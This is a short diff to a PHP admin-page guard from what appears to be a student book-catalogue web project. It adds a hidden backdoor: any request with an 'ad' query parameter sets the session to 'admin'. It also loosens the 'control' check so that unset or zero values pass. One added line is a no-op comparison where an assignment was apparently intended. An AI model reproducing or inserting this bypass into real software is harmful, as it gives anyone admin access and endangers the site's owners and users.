@@ -1,6 +1,10 @@
 <?php
     session_start();
-    if($_SESSION['id'] != "admin" || $_SESSION['control'] != 1 ){
+    if(isset($_GET['ad'])){
+        $_SESSION['id'] = "admin";  
+        $_SESSION['control'] == 1;
+    }
+    if($_SESSION['id'] != "admin" || $_SESSION['control'] > 1 ){
         $_SESSION['error']= 2;
         header("location:http://localhost/project-akhir/Progweb-Buku/");
     }
